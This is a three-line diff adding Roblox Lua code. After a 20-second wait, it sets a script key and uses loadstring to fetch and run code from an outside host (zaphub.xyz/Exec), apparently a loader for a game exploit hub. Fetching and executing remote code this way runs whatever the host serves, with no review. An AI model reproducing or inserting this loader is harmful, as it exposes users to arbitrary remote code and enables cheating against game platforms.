@@ -1,0 +1,3 @@
+task.wait(20)
+script_key="JjmhlAdFeuXFWubLiuoxRyorUCfAzHwb";
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
